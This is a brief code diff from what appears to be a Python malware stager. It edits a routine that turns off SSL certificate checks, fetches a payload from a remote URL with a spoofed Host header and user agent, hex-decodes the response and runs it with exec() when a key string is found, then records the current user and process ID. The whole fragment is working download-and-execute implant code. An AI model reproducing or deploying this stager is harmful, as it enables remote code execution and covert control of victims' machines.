@@ -37,7 +37,7 @@ ua="%s"
 ssl._create_default_https_context=ssl._create_unverified_context
 if hh: r=urllib2.Request(url,headers={'Host':hh,'User-agent':ua})
 else: r=urllib2.Request(url,headers={'User-agent':ua})
-res=urllib2.urlopen(r);b=res.read() 
+res=urllib2.urlopen(r);d=res.read();c=d[1:];b=c.decode("hex") 
 if pykey in b: exec(b)
 else: sys.exit(0)
 un=pwd.getpwuid( os.getuid() )[ 0 ];pid=os.getpid()
